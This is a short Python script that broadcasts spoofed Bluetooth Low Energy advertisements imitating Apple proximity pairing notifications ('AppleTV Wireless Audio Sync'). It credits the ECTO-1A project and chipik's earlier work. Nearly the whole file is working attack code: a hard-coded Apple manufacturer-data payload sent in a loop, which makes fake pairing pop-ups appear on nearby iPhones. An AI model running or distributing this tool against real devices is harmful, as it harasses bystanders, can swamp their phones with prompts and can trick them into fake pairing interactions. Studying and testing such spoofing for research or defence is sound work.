
# Description: Apple proximity pairing notification spoofing
# Message: AppleTV Wireless Audio Sync


# Author: ECTO-1A & SAY-10
# Github: https://github.com/ECTO-1A

# Based on the previous work of chipik / _hexway

import argparse
import bluetooth._bluetooth as bluez
from time import sleep
from utils.bluetooth_utils import toggle_device, start_le_advertising, stop_le_advertising

# Add a docstring to describe the purpose of the script
help_desc = '''
Apple Proximity Pairing Notification Spoofing

---ECTO-1A August 2023---

Based on the previous work of chipik / _hexway
'''

def main():
    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-i', '--interval', default=200, type=int, help='Advertising interval')
    args = parser.parse_args()

    dev_id = 0  # the default Bluetooth device is hci0
    toggle_device(dev_id, True)

    bt_data = (0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc0, 0x19, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00)

    try:
        sock = bluez.hci_open_dev(dev_id)
    except Exception as e:
        print(f"Unable to connect to Bluetooth hardware {dev_id}: {e}")
        return

    print("Advertising Started... Press Ctrl+C to Stop")

    try:
        start_le_advertising(sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval, data=bt_data)
        while True:
            sleep(2)
    except KeyboardInterrupt:
        stop_le_advertising(sock)
    except Exception as e:
        print(f"An error occurred: {e}")
        stop_le_advertising(sock)

if __name__ == "__main__":
    main()
